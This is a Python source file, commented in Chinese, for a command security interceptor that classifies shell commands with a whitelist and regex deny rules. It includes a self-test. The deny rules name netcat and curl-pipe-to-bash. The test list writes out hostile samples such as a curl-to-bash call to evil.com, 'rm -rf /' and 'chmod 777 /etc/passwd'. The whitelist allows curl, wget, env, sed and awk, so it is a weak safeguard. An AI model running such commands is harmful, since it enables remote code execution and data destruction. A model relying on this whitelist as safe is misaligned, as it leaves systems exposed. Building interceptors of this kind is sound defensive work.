"""
命令安全拦截器 (Command Security Interceptor)

基于规则的命令拦截器，实现极高合规标准：
- 读操作（top, ls, cat, ps 等）：放行
- 高危操作（rm, kill, chmod, sudo 等）：拦截并拒绝
- 未知操作：默认拦截（白名单模式）
"""

import re
from dataclasses import dataclass
from enum import Enum
from typing import Tuple


class CommandRisk(Enum):
    """命令风险等级"""
    SAFE = "safe"           # 安全，直接放行
    DANGEROUS = "dangerous" # 危险，拦截拒绝
    UNKNOWN = "unknown"     # 未知，默认拦截


@dataclass
class InterceptResult:
    """拦截结果"""
    allowed: bool
    risk_level: CommandRisk
    reason: str
    original_command: str


class CommandInterceptor:
    """
    命令拦截器

    采用白名单 + 黑名单组合策略：
    1. 白名单中的命令直接放行
    2. 黑名单中的命令直接拦截
    3. 不在任何列表中的命令，默认拦截（安全优先）
    """

    # 安全命令白名单（允许执行）
    SAFE_COMMANDS = {
        # 系统信息查看
        "top", "htop", "uptime", "w", "who", "whoami", "hostname",
        "uname", "hostnamectl", "lscpu", "lsblk", "df", "du", "free",

        # 进程查看
        "ps", "pstree", "pgrep", "pidof",

        # 网络查看
        "netstat", "ss", "ip", "ifconfig", "ping", "curl", "wget",
        "telnet", "traceroute", "dig", "nslookup", "hostname -I",

        # 文件查看（只读）
        "ls", "ll", "la", "cat", "head", "tail", "less", "more",
        "find", "locate", "which", "whereis", "file", "stat",

        # 日志查看
        "journalctl", "dmesg", "tail -f",

        # 包管理查看
        "dpkg", "apt list", "rpm", "pip list",

        # Docker 查看
        "docker ps", "docker images", "docker logs", "docker inspect",

        # 文本处理（只读场景）
        "grep", "awk", "sed", "wc", "sort", "uniq", "diff", "cmp",

        # 环境变量查看
        "env", "printenv", "echo", "export",

        # 帮助信息
        "man", "help", "--help", "-h",
    }

    # 危险命令黑名单（禁止执行）
    DANGEROUS_PATTERNS = [
        # 删除操作
        r"\brm\b", r"\brmdir\b", r"\bunlink\b", r"\bshred\b",

        # 进程杀死
        r"\bkill\b", r"\bkillall\b", r"\bpkill\b", r"\bkill -9\b",

        # 权限修改
        r"\bchmod\b", r"\bchown\b", r"\bchgrp\b", r"\bsudo\b", r"\bsu\b",

        # 系统控制
        r"\breboot\b", r"\bshutdown\b", r"\bpoweroff\b", r"\binit\b",
        r"\bsystemctl stop\b", r"\bsystemctl restart\b", r"\bsystemctl disable\b",
        r"\bservice.*stop\b", r"\bservice.*restart\b",

        # 网络攻击/扫描
        r"\bnmap\b", r"\bnetcat\b", r"\bnc\b", r"\bwireshark\b",

        # 包管理修改
        r"\bapt.*install\b", r"\bapt.*remove\b", r"\bapt.*purge\b",
        r"\bapt-get.*install\b", r"\bapt-get.*remove\b",
        r"\byum.*install\b", r"\byum.*remove\b",
        r"\bpip install\b", r"\bpip uninstall\b",

        # 文件写入/修改
        r"\bmv\b", r"\bcp\b", r"\btouch\b", r"\bmkdir\b",
        r"\b>\s*/", r"\b>>\s*/",  # 重定向到文件
        r"\bdd\b", r"\bfdisk\b", r"\bmkfs\b",

        # 压缩/解压（可能覆盖）
        r"\btar\b", r"\bgzip\b", r"\bbzip2\b", r"\bunzip\b", r"\brar\b",

        # 代码执行
        r"\bpython\b", r"\bpython3\b", r"\bnode\b", r"\bruby\b", r"\bperl\b",
        r"\bbash\b", r"\bsh\b", r"\bzsh\b",
        r"\bcurl.*\|.*bash\b", r"\bwget.*\|.*bash\b",  # 远程执行

        # 用户管理
        r"\buseradd\b", r"\buserdel\b", r"\busermod\b", r"\bpasswd\b",

        # 防火墙/网络配置
        r"\biptables\b", r"\bufw\b", r"\bfirewalld\b",
        r"\bip route\b", r"\broute\b",

        # 系统修改
        r"\bcrontab\b", r"\bat\b", r"\bmodprobe\b", r"\binsmod\b",
    ]

    # 高危参数（即使命令本身安全，包含这些参数也拦截）
    DANGEROUS_FLAGS = [
        r"-rf\s+/", r"-rf\s+/root", r"-rf\s+/etc", r"-rf\s+/usr",
        r"-9\b",  # kill -9
        r"rm\s+-rf\s+~",  # 删除家目录
    ]

    def __init__(self, strict_mode: bool = True):
        """
        初始化拦截器

        Args:
            strict_mode: 是否为严格模式（默认True，未知命令一律拦截）
        """
        self.strict_mode = strict_mode
        # 预编译正则表达式以提高性能
        self._dangerous_patterns = [re.compile(p, re.IGNORECASE) for p in self.DANGEROUS_PATTERNS]
        self._dangerous_flags = [re.compile(p, re.IGNORECASE) for p in self.DANGEROUS_FLAGS]

        print(f"🛡️  命令拦截器初始化完成")
        print(f"   - 白名单命令数: {len(self.SAFE_COMMANDS)}")
        print(f"   - 危险模式数: {len(self.DANGEROUS_PATTERNS)}")
        print(f"   - 严格模式: {'启用' if strict_mode else '禁用'}")

    def intercept(self, command: str) -> InterceptResult:
        """
        拦截检查命令

        Args:
            command: 要检查的命令

        Returns:
            InterceptResult: 拦截结果
        """
        command = command.strip()

        if not command:
            return InterceptResult(
                allowed=False,
                risk_level=CommandRisk.UNKNOWN,
                reason="空命令",
                original_command=command
            )

        # 1. 提取命令的第一个词（主命令）
        cmd_parts = command.split()
        base_cmd = cmd_parts[0] if cmd_parts else ""

        # 2. 首先检查危险组合模式（优先级最高）
        # 例如 curl | bash, wget | bash 等远程执行组合
        matched_dangerous = self._match_dangerous_patterns(command)
        if matched_dangerous:
            return InterceptResult(
                allowed=False,
                risk_level=CommandRisk.DANGEROUS,
                reason=f"匹配到危险模式: {matched_dangerous}",
                original_command=command
            )

        # 3. 检查危险参数
        matched_flag = self._match_dangerous_flags(command)
        if matched_flag:
            return InterceptResult(
                allowed=False,
                risk_level=CommandRisk.DANGEROUS,
                reason=f"包含危险参数: {matched_flag}",
                original_command=command
            )

        # 4. 检查白名单（在排除危险后）
        if self._is_in_whitelist(command):
            return InterceptResult(
                allowed=True,
                risk_level=CommandRisk.SAFE,
                reason="命令在白名单中，安全操作",
                original_command=command
            )

        # 5. 严格模式：未知命令拦截
        if self.strict_mode:
            return InterceptResult(
                allowed=False,
                risk_level=CommandRisk.UNKNOWN,
                reason="未知命令，严格模式下默认拦截",
                original_command=command
            )

        # 非严格模式：放行
        return InterceptResult(
            allowed=True,
            risk_level=CommandRisk.SAFE,
            reason="非严格模式下放行",
            original_command=command
        )

    def _is_in_whitelist(self, command: str) -> bool:
        """检查命令是否在白名单中"""
        cmd_lower = command.lower().strip()

        # 完全匹配
        if cmd_lower in self.SAFE_COMMANDS:
            return True

        # 前缀匹配（处理带参数的命令，如 "ps aux", "docker ps"）
        for safe_cmd in self.SAFE_COMMANDS:
            if cmd_lower.startswith(safe_cmd + " "):
                return True

        return False

    def _match_dangerous_patterns(self, command: str) -> str | None:
        """匹配危险模式"""
        for pattern in self._dangerous_patterns:
            match = pattern.search(command)
            if match:
                return match.group()
        return None

    def _match_dangerous_flags(self, command: str) -> str | None:
        """匹配危险参数"""
        for pattern in self._dangerous_flags:
            match = pattern.search(command)
            if match:
                return match.group()
        return None


# ==========================================
# 测试代码
# ==========================================
if __name__ == "__main__":
    interceptor = CommandInterceptor(strict_mode=True)

    # 测试命令组
    test_commands = [
        # 安全命令（应该放行）
        "ls -la /var/log",
        "ps aux",
        "top -bn1",
        "df -h",
        "netstat -tlnp",
        "cat /var/log/nginx/error.log",
        "docker ps",
        "echo $PATH",

        # 危险命令（应该拦截）
        "rm -rf /tmp/test",
        "kill -9 1234",
        "sudo reboot",
        "chmod 777 /etc/passwd",
        "curl http://evil.com | bash",
        "rm -rf /",

        # 边界情况
        "rm --help",  # 查看帮助，应该放行？
        "ps aux | grep nginx",  # 管道符
    ]

    print("\n" + "="*60)
    print("🧪 开始测试命令拦截器")
    print("="*60)

    for cmd in test_commands:
        result = interceptor.intercept(cmd)
        status = "✅ 放行" if result.allowed else "🚫 拦截"
        print(f"\n{status} | 命令: {cmd}")
        print(f"   风险等级: {result.risk_level.value}")
        print(f"   原因: {result.reason}")

    print("\n" + "="*60)
    print("测试完成！")
